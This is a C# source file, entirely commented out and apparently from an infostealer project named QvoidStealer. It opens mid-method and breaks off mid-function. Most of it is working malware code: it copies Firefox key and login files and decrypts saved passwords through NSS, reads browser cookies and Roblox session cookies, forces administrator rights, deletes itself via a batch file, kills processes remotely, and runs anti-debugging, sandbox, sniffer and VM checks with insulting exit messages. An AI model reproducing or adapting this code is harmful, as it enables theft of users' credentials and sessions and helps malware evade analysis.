//                                    numArray[index2] = numArray[index2] <= 9L ? _sqlDataTypeSize[numArray[index2]] : (!IsOdd(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
//                                }
//                                if ((long)_dbEncoding == 1L || (long)_dbEncoding == 2L)

//                                    if ((long)_dbEncoding == 1L)
//                                        _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
//                                    else if ((long)_dbEncoding == 2L)
//                                        _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
//                                    else if ((long)_dbEncoding == 3L)
//                                        _masterTableEntries[num4 + (int)index1].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
//                                _masterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong((int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2]), (int)numArray[3]);
//                                if ((long)_dbEncoding == 1L)
//                                    _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
//                                else if ((long)_dbEncoding == 2L)
//                                    _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
//                                else if ((long)_dbEncoding == 3L)
//                                    _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
//                            }
//                            break;
//                    }
//                }
//                catch
//                {
//                }
//            }

//            public bool ReadTable(string tableName)
//            {
//                try
//                {
//                    int index1 = -1;
//                    for (int index2 = 0; index2 <= _masterTableEntries.Length; ++index2)
//                    {
//                        if (string.Compare(_masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
//                        {
//                            index1 = index2;
//                            break;
//                        }
//                    }
//                    if (index1 == -1)
//                        return false;
//                    string[] strArray = _masterTableEntries[index1].SqlStatement.Substring(_masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
//                    for (int index2 = 0; index2 <= strArray.Length - 1; ++index2)
//                    {
//                        strArray[index2] = strArray[index2].TrimStart();
//                        int length = strArray[index2].IndexOf(' ');
//                        if (length > 0)
//                            strArray[index2] = strArray[index2].Substring(0, length);
//                        if (strArray[index2].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
//                        {
//                            Array.Resize(ref _fieldNames, index2 + 1);
//                            _fieldNames[index2] = strArray[index2];
//                        }
//                    }
//                    return ReadTableFromOffset((ulong)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
//                }
//                catch
//                {
//                    return false;
//                }
//            }

//            private ulong ConvertToULong(int startIndex, int size)
//            {
//                try
//                {
//                    if (size > 8 | size == 0)
//                        return 0;
//                    ulong num = 0;
//                    for (int index = 0; index <= size - 1; ++index)
//                        num = num << 8 | (ulong)_fileBytes[startIndex + index];
//                    return num;
//                }
//                catch
//                {
//                    return 0;
//                }
//            }

//            private int Gvl(int startIdx)
//            {
//                try
//                {
//                    if (startIdx > _fileBytes.Length)
//                        return 0;
//                    for (int index = startIdx; index <= startIdx + 8; ++index)
//                    {
//                        if (index > _fileBytes.Length - 1)
//                            return 0;
//                        if (((int)_fileBytes[index] & 128) != 128)
//                            return index;
//                    }
//                    return startIdx + 8;
//                }
//                catch
//                {
//                    return 0;
//                }
//            }

//            private long Cvl(int startIdx, int endIdx)
//            {
//                try
//                {
//                    ++endIdx;
//                    byte[] numArray = new byte[8];
//                    int num1 = endIdx - startIdx;
//                    bool flag = false;
//                    if (num1 == 0 | num1 > 9)
//                        return 0;
//                    if (num1 == 1)
//                    {
//                        numArray[0] = (byte)(_fileBytes[startIdx] & (uint)sbyte.MaxValue);
//                        return BitConverter.ToInt64(numArray, 0);
//                    }
//                    if (num1 == 9)
//                        flag = true;
//                    int num2 = 1;
//                    int num3 = 7;
//                    int index1 = 0;
//                    if (flag)
//                    {
//                        numArray[0] = _fileBytes[endIdx - 1];
//                        --endIdx;
//                        index1 = 1;
//                    }
//                    int index2 = endIdx - 1;
//                    while (index2 >= startIdx)
//                    {
//                        if (index2 - 1 >= startIdx)
//                        {
//                            numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2 | _fileBytes[index2 - 1] << num3);
//                            ++num2;
//                            ++index1;
//                            --num3;
//                        }
//                        else if (!flag)
//                            numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2);
//                        index2 += -1;
//                    }
//                    return BitConverter.ToInt64(numArray, 0);
//                }
//                catch
//                {
//                    return 0;
//                }
//            }

//            private static bool IsOdd(long value)
//            {
//                return (value & 1L) == 1L;
//            }

//            private struct RecordHeaderField
//            {
//                public long Size;
//                public long Type;
//            }

//            private struct TableEntry
//            {
//                public string[] Content;
//            }

//            private struct SqliteMasterEntry
//            {
//                public string ItemName;
//                public long RootNum;
//                public string SqlStatement;
//            }

//            public static SQLite ReadTable(string database, string table)
//            {
//                if (!File.Exists(database))
//                    return null;
//                string NewPath = Path.GetTempFileName() + ".tmpdb";
//                File.Copy(database, NewPath);
//                SQLite SQLiteConnection = new SQLite(NewPath);
//                SQLiteConnection.ReadTable(table);
//                File.Delete(NewPath);
//                if (SQLiteConnection.GetRowCount() == 65536)
//                    return null;
//                return SQLiteConnection;
//            }
//        }

//        internal sealed class Cookies
//        {
//            public static string GetAll()
//            {
//                string result = string.Empty;
//                foreach (string browser in Profile.GetMozillaBrowsers())
//                {
//                    foreach (var account in Cookies.Get(browser))
//                    {
//                        var _browser = browser.Split('\\');
//                        result += account.ToString(_browser[_browser.Length - 1]);
//                    }
//                }

//                return result;
//            }

//            public static List<CookieModel> Get(string BrowserDir)
//            {
//                List<CookieModel> lcCookies = new List<CookieModel>();
//                // Get firefox default profile directory
//                string profile = Profile.GetProfile(BrowserDir);
//                // Read cookies from file
//                if (profile == null) return lcCookies;
//                string db_location = Path.Combine(profile, "cookies.sqlite");
//                // Read data from table
//                SQLite sSQLite = SQLite.ReadTable(db_location, "moz_cookies");
//                if (sSQLite == null) return lcCookies;
//                // Get values from table
//                for (int i = 0; i < sSQLite.GetRowCount(); i++)
//                {
//                    CookieModel cCookie = new CookieModel();
//                    cCookie.Name = sSQLite.GetValue(i, 2);
//                    cCookie.Value = sSQLite.GetValue(i, 3);
//                    cCookie.HostName = sSQLite.GetValue(i, 5);

//                    lcCookies.Add(cCookie);
//                }

//                return lcCookies;
//            }
//        }

//        internal sealed class Passwords
//        {
//            private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
//            private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
//            private static string[] RequiredFiles = new string[] { "key3.db", "key4.db", "logins.json", "cert9.db" };

//            // Copy key3.db, key4.db, logins.json if exists
//            private static string CopyRequiredFiles(string profile)
//            {
//                string profileName = new DirectoryInfo(profile).Name;
//                string newProfileName = Path.Combine(CopyTempPath, profileName);

//                if (!Directory.Exists(newProfileName))
//                    Directory.CreateDirectory(newProfileName);
//                //Directory.Delete(newProfileName);


//                foreach (string file in RequiredFiles)
//                    try
//                    {
//                        string requiredFile = Path.Combine(profile, file);
//                        if (File.Exists(requiredFile))
//                            File.Copy(requiredFile, Path.Combine(newProfileName, Path.GetFileName(requiredFile)));
//                    }
//                    catch (Exception ex)
//                    {
//                        Console.WriteLine("Failed to copy files to decrypt passwords\n" + ex);
//                        return null;
//                    }

//                return Path.Combine(CopyTempPath, profileName);
//            }

//            public static string GetAll()
//            {
//                string result = string.Empty;
//                foreach (string browser in Profile.GetMozillaBrowsers())
//                {
//                    if (!Directory.Exists(browser))
//                        continue;

//                    foreach (var account in Passwords.Get(browser))
//                    {
//                        var _browser = browser.Split('\\');
//                        result += account.ToString(_browser[_browser.Length - 1]);
//                    }
//                }

//                return result;
//            }

//            // Get passwords from gecko browser
//            public static List<CredentialModel> Get(string BrowserDir)
//            {
//                List<CredentialModel> pPasswords = new List<CredentialModel>();

//                // Get firefox default profile directory
//                string profile = Profile.GetProfile(BrowserDir);
//                if (profile == null) return pPasswords;
//                // Get firefox nss3.dll location
//                string Nss3Dir = Profile.GetMozillaPath();
//                if (Nss3Dir == null) return pPasswords;
//                // Copy required files to temp dir
//                string newProfile = CopyRequiredFiles(profile);
//                if (newProfile == null) return pPasswords;
//                // Read accounts from file
//                string db_location = Path.Combine(newProfile, "logins.json");
//                if (!File.Exists(db_location))
//                    return null;
//                string JSON_STRING = File.ReadAllText(db_location);
//                // Parse Json string
//                var json = new Json(JSON_STRING);
//                json.Remove(new string[] { ",\"logins\":\\[", ",\"potentiallyVulnerablePasswords\"" });
//                string[] accounts = json.SplitData();
//                // Enumerate accounts
//                if (Decryptor.LoadNSS(Nss3Dir))
//                {
//                    if (!Decryptor.SetProfile(newProfile))
//                        Console.WriteLine("Failed to set profile!");

//                    foreach (string account in accounts)
//                    {
//                        CredentialModel pPassword = new CredentialModel();
//                        var json_account = new Json(account);

//                        string
//                            hostname = json_account.GetValue("hostname"),
//                            username = json_account.GetValue("encryptedUsername"),
//                            password = json_account.GetValue("encryptedPassword");

//                        if (!string.IsNullOrEmpty(password))
//                        {
//                            pPassword.Url = hostname;
//                            pPassword.Username = Decryptor.DecryptPassword(username);
//                            pPassword.Password = Decryptor.DecryptPassword(password);

//                            pPasswords.Add(pPassword);
//                        }
//                    }

//                    Decryptor.UnLoadNSS();
//                }
//                Directory.Delete(newProfile, recursive: true);
//                return pPasswords;
//            }
//        }
//    }
//}


//namespace QvoidStealer.Miscellaneous.Stealers.Browsers
//{
//    internal sealed class Json
//    {
//        public string Data;
//        public Json(string data)
//        {
//            this.Data = data;
//        }
//        // Get string value from json dictonary
//        public string GetValue(string value)
//        {
//            string result = String.Empty;
//            Regex valueRegex = new Regex($"\"{value}\":\"([^\"]+)\"");
//            Match valueMatch = valueRegex.Match(this.Data);
//            if (!valueMatch.Success)
//                return result;

//            result = Regex.Split(valueMatch.Value, "\"")[3];
//            return result;
//        }
//        // Remove string
//        public void Remove(string[] values)
//        {
//            foreach (string value in values)
//                this.Data = this.Data.Replace(value, "");
//        }
//        // Get array from json data
//        public string[] SplitData(string delimiter = "},")
//        {
//            return Regex.Split(this.Data, delimiter);
//        }
//    }

//    internal static class Utils
//    {
//        /// <summary>
//        /// Convert Color object into hex integer
//        /// </summary>
//        /// <param name="color">Color to be converted</param>
//        /// <returns>Converted hex integer</returns>
//        public static int ColorToHex(Color color)
//        {
//            string HS =
//                color.R.ToString("X2") +
//                color.G.ToString("X2") +
//                color.B.ToString("X2");

//            return int.Parse(HS, System.Globalization.NumberStyles.HexNumber);
//        }

//        internal static JObject StructToJson(object @struct)
//        {
//            Type type = @struct.GetType();
//            JObject json = new JObject();

//            FieldInfo[] fields = type.GetFields();
//            foreach (FieldInfo field in fields)
//            {
//                string name = FieldNameToJsonName(field.Name);
//                object value = field.GetValue(@struct);
//                if (value == null)
//                    continue;

//                if (value is bool)
//                    json.Add(name, (bool)value);
//                else if (value is int)
//                    json.Add(name, (int)value);
//                else if (value is Color)
//                    json.Add(name, ColorToHex((Color)value));
//                else if (value is string)
//                    json.Add(name, value as string);
//                else if (value is DateTime)
//                    json.Add(name, ((DateTime)value).ToString("O"));
//                else if (value is IList && value.GetType().IsGenericType)
//                {
//                    JArray array = new JArray();
//                    foreach (object obj in value as IList)
//                        array.Add(StructToJson(obj));
//                    json.Add(name, array);
//                }
//                else json.Add(name, StructToJson(value));
//            }
//            return json;
//        }

//        static string[] ignore = { "InLine" };
//        internal static string FieldNameToJsonName(string name)
//        {
//            if (ignore.ToList().Contains(name))
//                return name.ToLower();

//            List<char> result = new List<char>();

//            if (IsFullUpper(name))
//                result.AddRange(name.ToLower().ToCharArray());
//            else
//                for (int i = 0; i < name.Length; i++)
//                {
//                    if (i > 0 && char.IsUpper(name[i]))
//                        result.AddRange(new[] { '_', char.ToLower(name[i]) });
//                    else result.Add(char.ToLower(name[i]));
//                }
//            return string.Join("", result);
//        }

//        internal static bool IsFullUpper(string str)
//        {
//            bool upper = true;
//            for (int i = 0; i < str.Length; i++)
//            {
//                if (!char.IsUpper(str[i]))
//                {
//                    upper = false;
//                    break;
//                }
//            }
//            return upper;
//        }

//        public static string Decode(Stream source)
//        {
//            using (StreamReader reader = new StreamReader(source))
//                return reader.ReadToEnd();
//        }

//        public static byte[] Encode(string source, string encoding = "utf-8")
//            => Encoding.GetEncoding(encoding).GetBytes(source);

//        public static string ToString(this List<CredentialModel> credentialModels, string BrowserName)
//        {
//            string result = string.Empty;

//            if (credentialModels == null)
//                return "";

//            foreach (var model in credentialModels)
//            {
//                result += $"{Environment.NewLine}Browser  : {BrowserName}";
//                result += $"{Environment.NewLine}URL      : {model.Url}";
//                result += $"{Environment.NewLine}Username : {model.Username}";
//                result += $"{Environment.NewLine}Password : {model.Password}";
//                result += $"{Environment.NewLine}---------------------------------------------------------------------";
//            }


//            return result;
//        }

//        public static string ToString(this CredentialModel credentialModel, string BrowserName)
//        {
//            string result = string.Empty;

//            if (credentialModel == null)
//                return "";

//            result += $"{Environment.NewLine}Browser  : {BrowserName}";
//            result += $"{Environment.NewLine}URL      : {credentialModel.Url}";
//            result += $"{Environment.NewLine}Username : {credentialModel.Username}";
//            result += $"{Environment.NewLine}Password : {credentialModel.Password}";
//            result += $"{Environment.NewLine}---------------------------------------------------------------------";

//            return result;
//        }

//        public static string ToString(this List<CookieModel> cookieModels, string BrowserName)
//        {
//            string result = string.Empty;

//            if (cookieModels == null)
//                return "";

//            foreach (var model in cookieModels)
//            {
//                result += $"{Environment.NewLine}Browser   : {BrowserName}";
//                result += $"{Environment.NewLine}Host Name : {model.HostName}";
//                result += $"{Environment.NewLine}Name      : {model.Name}";
//                result += $"{Environment.NewLine}Value     : {model.Value}";
//                result += $"{Environment.NewLine}---------------------------------------------------------------------";
//            }

//            return result;
//        }

//        public static string ToString(this CookieModel cookieModel, string BrowserName)
//        {
//            string result = string.Empty;

//            if (cookieModel == null)
//                return "";

//            result += $"{Environment.NewLine}Browser   : {BrowserName}";
//            result += $"{Environment.NewLine}Host Name : {cookieModel.HostName}";
//            result += $"{Environment.NewLine}Name      : {cookieModel.Name}";
//            result += $"{Environment.NewLine}Value     : {cookieModel.Value}";
//            result += $"{Environment.NewLine}---------------------------------------------------------------------";

//            return result;
//        }
//    }

//    public class CredentialModel
//    {
//        public string Url { get; set; }
//        public string Username { get; set; }
//        public string Password { get; set; }
//    }

//    public class CookieModel
//    {
//        public string Name;
//        public string Value;
//        public string HostName;
//    }
//}


//namespace QvoidWrapper
//{
//    internal sealed class Json
//    {
//        public string Data;
//        public Json(string data)
//        {
//            this.Data = data;
//        }
//        // Get string value from json dictonary
//        public string GetValue(string value)
//        {
//            string result = String.Empty;
//            Regex valueRegex = new Regex($"\"{value}\":\"([^\"]+)\"");
//            Match valueMatch = valueRegex.Match(this.Data);
//            if (!valueMatch.Success)
//                return result;

//            result = Regex.Split(valueMatch.Value, "\"")[3];
//            return result;
//        }
//        // Remove string
//        public void Remove(string[] values)
//        {
//            foreach (string value in values)
//                this.Data = this.Data.Replace(value, "");
//        }
//        // Get array from json data
//        public string[] SplitData(string delimiter = "},")
//        {
//            return Regex.Split(this.Data, delimiter);
//        }
//    }

//    static public class Other
//    {
//        static public string Sort(string input)
//        {
//            char temp;
//            char[] charstr = input.ToCharArray();
//            for (int i = 1; i < charstr.Length; i++)
//            {
//                for (int j = 0; j < charstr.Length - 1; j++)
//                {
//                    if (charstr[j] > charstr[j + 1])
//                    {
//                        temp = charstr[j];
//                        charstr[j] = charstr[j + 1];
//                        charstr[j + 1] = temp;
//                    }
//                }
//            }

//            return new string(charstr);
//        }

//        public static void ExecuteCommand(string fileName, string Args)
//        {
//            if (!IsAdministrator())
//                throw new Exception("Program is not administrator");

//            using (Process process = new Process())
//            {
//                if (Args != "")
//                    process.StartInfo.Arguments = Args;

//                process.StartInfo.FileName = fileName;
//                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
//                process.StartInfo.UseShellExecute = true;
//                process.StartInfo.Verb = "runas";
//                process.Start();
//            }
//        }

//        public static bool IsAdministrator()
//        {
//            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
//        }

//        public static void ForceAdministrator()
//        {
//            while (!IsAdministrator())
//            {
//                ProcessStartInfo startInfo = new ProcessStartInfo();
//                startInfo.UseShellExecute = true;
//                startInfo.WorkingDirectory = Environment.CurrentDirectory;
//                startInfo.FileName = Application.ExecutablePath;
//                startInfo.Verb = "runas";

//                try { Process.Start(startInfo); }
//                catch { continue; }
//                Environment.Exit(0);
//            }
//        }

//        public static Color Spectrum(int mode, float time = 0f)
//        {
//            time = time == 0f ? (float)((DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 62830) / 2000.0) : time;
//            return Color.FromArgb(255,
//                   (int)((Math.Sin(time + (mode / Math.PI)) * .5f + .5f) * 255.0f),
//                   (int)((Math.Sin(time + (mode / Math.PI) + 2 * Math.PI / 3) * .5f + .5f) * 255.0f),
//                   (int)((Math.Sin(time + (mode / Math.PI) + 4 * Math.PI / 3) * .5f + .5f) * 255.0f));
//        }

//        public static void SelfDestruct()
//        {
//            string strName = "destruct.bat";
//            string strPath = Path.Combine(Directory.GetCurrentDirectory(), strName);
//            string strExe = new FileInfo(Application.ExecutablePath).Name;

//            StreamWriter swDestruct = new StreamWriter(strPath);
//            swDestruct.WriteLine("attrib \"" + strExe + "\"" + " -a -s -r -h");
//            swDestruct.WriteLine(":Repeat");
//            swDestruct.WriteLine("del " + "\"" + strExe + "\"");
//            swDestruct.WriteLine("if exist \"" + strExe + "\"" + " goto Repeat");
//            swDestruct.WriteLine("del \"" + strName + "\"");
//            swDestruct.Close();

//            Process procDestruct = new Process();
//            procDestruct.StartInfo.FileName = "destruct.bat";
//            procDestruct.StartInfo.CreateNoWindow = true;
//            procDestruct.StartInfo.UseShellExecute = false;

//            try
//            {
//                procDestruct.Start();
//            }
//            catch (Exception)
//            {
//                Application.Exit();
//            }
//        }

//        public static string RobloxCookies()
//        {
//            try
//            {
//                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
//                {
//                    if (key == null)
//                        return null;

//                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
//                    return cookie.Substring(46).Trim('>');
//                }
//            }
//            catch
//            { return null; }
//        }
//    }

//    static public class ProcessHandler
//    {
//        [StructLayout(LayoutKind.Sequential)]
//        struct RM_UNIQUE_PROCESS
//        {
//            public int dwProcessId;
//            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
//        }

//        const int RmRebootReasonNone = 0;
//        const int CCH_RM_MAX_APP_NAME = 255;
//        const int CCH_RM_MAX_SVC_NAME = 63;

//        enum RM_APP_TYPE
//        {
//            RmUnknownApp = 0,
//            RmMainWindow = 1,
//            RmOtherWindow = 2,
//            RmService = 3,
//            RmExplorer = 4,
//            RmConsole = 5,
//            RmCritical = 1000
//        }

//        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
//        struct RM_PROCESS_INFO
//        {
//            public RM_UNIQUE_PROCESS Process;

//            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)]
//            public string strAppName;

//            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)]
//            public string strServiceShortName;

//            public RM_APP_TYPE ApplicationType;
//            public uint AppStatus;
//            public uint TSSessionId;
//            [MarshalAs(UnmanagedType.Bool)]
//            public bool bRestartable;
//        }

//        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
//        static extern int RmRegisterResources(uint pSessionHandle,
//                                            UInt32 nFiles,
//                                            string[] rgsFilenames,
//                                            UInt32 nApplications,
//                                            [In] RM_UNIQUE_PROCESS[] rgApplications,
//                                            UInt32 nServices,
//                                            string[] rgsServiceNames);

//        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
//        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

//        [DllImport("rstrtmgr.dll")]
//        static extern int RmEndSession(uint pSessionHandle);

//        [DllImport("rstrtmgr.dll")]
//        static extern int RmGetList(uint dwSessionHandle,
//                                    out uint pnProcInfoNeeded,
//                                    ref uint pnProcInfo,
//                                    [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
//                                    ref uint lpdwRebootReasons);

//        static public List<Process> WhoIsLocking(string path)
//        {
//            uint handle;
//            string key = Guid.NewGuid().ToString();
//            List<Process> processes = new List<Process>();

//            int res = RmStartSession(out handle, 0, key);
//            if (res != 0) throw new Exception("Could not begin restart session.  Unable to determine file locker.");

//            try
//            {
//                const int ERROR_MORE_DATA = 234;
//                uint pnProcInfoNeeded = 0,
//                    pnProcInfo = 0,
//                    lpdwRebootReasons = RmRebootReasonNone;

//                string[] resources = new string[] { path };

//                res = RmRegisterResources(handle, (uint)resources.Length, resources, 0, null, 0, null);

//                if (res != 0) throw new Exception("Could not register resource.");
//                res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons);

//                if (res == ERROR_MORE_DATA)
//                {
//                    RM_PROCESS_INFO[] processInfo = new RM_PROCESS_INFO[pnProcInfoNeeded];
//                    pnProcInfo = pnProcInfoNeeded;

//                    res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, processInfo, ref lpdwRebootReasons);
//                    if (res == 0)
//                    {
//                        processes = new List<Process>((int)pnProcInfo);
//                        for (int i = 0; i < pnProcInfo; i++)
//                        {
//                            try
//                            {
//                                processes.Add(Process.GetProcessById(processInfo[i].Process.dwProcessId));
//                            }
//                            catch (ArgumentException) { }
//                        }
//                    }
//                    else throw new Exception("Could not list processes locking resource.");
//                }
//                else if (res != 0) throw new Exception("Could not list processes locking resource. Failed to get size of result.");
//            }
//            finally
//            {
//                RmEndSession(handle);
//            }

//            return processes;
//        }

//        public static void remoteProcessKill(string computerName, string userName, string pword, string processName)
//        {
//            var connectoptions = new ConnectionOptions();
//            connectoptions.Username = userName;
//            connectoptions.Password = pword;

//            ManagementScope scope = new ManagementScope(@"\\" + computerName + @"\root\cimv2", connectoptions);

//            // WMI query
//            var query = new SelectQuery("select * from Win32_process where name = '" + processName + "'");

//            using (var searcher = new ManagementObjectSearcher(scope, query))
//            {
//                foreach (ManagementObject process in searcher.Get())
//                {
//                    process.InvokeMethod("Terminate", null);
//                    process.Dispose();
//                }
//            }
//        }

//        public static void localProcessKill(string processName)
//        {
//            foreach (Process p in Process.GetProcessesByName(processName))
//            {
//                p.Kill();
//            }
//        }

//        [DllImport("kernel32.dll")]
//        public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

//        public const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

//    }

//    static public class Protection
//    {
//        [DllImport("ntdll.dll")]
//        internal static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

//        [DllImport("ntdll.dll")]
//        internal static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

//        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
//        internal static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

//        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
//        internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

//        [DllImport("kernel32.dll", SetLastError = true)]
//        internal static extern IntPtr GetModuleHandle(string lpModuleName);

//        [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
//        internal static extern bool GetModuleHandleEx(UInt32 dwFlags, string lpModuleName, out IntPtr phModule);

//        [DllImport("kernel32.dll")]
//        internal static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

//        [DllImport("kernel32.dll")]
//        internal static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

//        internal static void EraseSection(IntPtr address, int size)
//        {
//            IntPtr sz = (IntPtr)size;
//            IntPtr dwOld = default(IntPtr);
//            VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
//            ZeroMemory(address, sz);
//            IntPtr temp = default(IntPtr);
//            VirtualProtect(address, sz, dwOld, ref temp);
//        }

//        public struct PE
//        {
//            static public int[] SectionTabledWords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
//            static public int[] Bytes = new int[] { 0x1A, 0x1B };
//            static public int[] Words = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
//            static public int[] dWords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };
//        }

//        private static string _Id;
//        private static int _UniqueSeed = 0;

//        static private bool Valid(bool Exit, string[] _rootCaPublicKeys, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslpolicyerrors)
//        {
//            if (sslpolicyerrors != SslPolicyErrors.None) return false;

//            var rootCertificate = SelfSignedCertificate(chain);
//            var publicKey = Convert.ToBase64String(rootCertificate.PublicKey.EncodedKeyValue.RawData);
//            var result = rootCertificate.Verify() && _rootCaPublicKeys.Contains(publicKey);
//            if (!result && Exit)
//                Environment.FailFast("Some retard who thinks he can reverse this application.");

//            return result;
//        }

//        static private X509Certificate2 SelfSignedCertificate(X509Chain chain)
//        {
//            foreach (var x509ChainElement in chain.ChainElements)
//            {
//                if (x509ChainElement.Certificate.SubjectName.Name != x509ChainElement.Certificate.IssuerName.Name) continue;
//                return x509ChainElement.Certificate;
//            }
//            throw new Exception("Self-signed certificate not found.");
//        }

//        static public void WebSniffers(bool Exit)
//        {
//            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

//            HttpWebRequest.DefaultWebProxy = new WebProxy();
//            WebRequest.DefaultWebProxy = new WebProxy();

//            if (GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || GetModuleHandle("RestSharp.dll") != IntPtr.Zero || GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
//            {
//                Debug.WriteLine("HTTP Debugger detected");
//                if (Exit)
//                    Environment.FailFast("Some retard who thinks he can reverse this application.");
//            }

//            try
//            {
//                var request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggcf://jjj.qebcobk.pbz/bnhgu2/nhgubevmr"));
//                request.ServerCertificateValidationCallback = (sender, cert, chain, error) => Valid(Exit, new List<string>() { "MIIBCgKCAQEAxszlc+b71LvlLS0ypt/lgT/JzSVJtnEqw9WUNGeiChywX2mmQLHEt7KP0JikqUFZOtPclNY823Q4pErMTSWC90qlUxI47vNJbXGRfmO2q6Zfw6SE+E9iUb74xezbOJLjBuUIkQzEKEFV+8taiRV+ceg1v01yCT2+OjhQW3cxG42zxyRFmqesbQAUWgS3uhPrUQqYQUEiTmVhh4FBUKZ5XIneGUpX1S7mXRxTLH6YzRoGFqRoc9A0BBNcoXHTWnxV215k4TeHMFYE5RG0KYAS8Xk5iKICEXwnZreIt3jyygqoOKsKZMK/Zl2VhMGhJR6HXRpQCyASzEG7bgtROLhLywIDAQAB" }.ToArray(), cert, chain, error);

//                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
//                response.Close();
//            }
//            catch { }
//        }

//        static public void AntiDebug(bool Exit)
//        {
//#if !DEBUG
//            bool isDebuggerPresent = true;
//            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
//            if (isDebuggerPresent)
//            {
//                Debug.WriteLine("Fuck you!");
//                if (Exit)
//                    Environment.FailFast("Some retard who thinks he can reverse this application.");
//            }
//#endif
//        }

//        static public void Sandboxie(bool Exit)
//        {
//            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
//            {
//                Debug.WriteLine("Sandboxie detected");
//                if (Exit)
//                    Environment.FailFast("Some retard who thinks he can reverse this application.");
//            }
//        }

//        static public void Emulation(bool Exit)
//        {
//            long tickCount = Environment.TickCount;
//            Thread.Sleep(500);
//            long tickCount2 = Environment.TickCount;
//            if (((tickCount2 - tickCount) < 500L))
//            {
//                Debug.WriteLine("Emulation Detected");
//                if (Exit)
//                    Environment.FailFast("Some retard who thinks he can reverse this application.");
//            }
//        }

//        static public void DetectVM(bool Exit)
//        {
//            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
//            using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
//                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
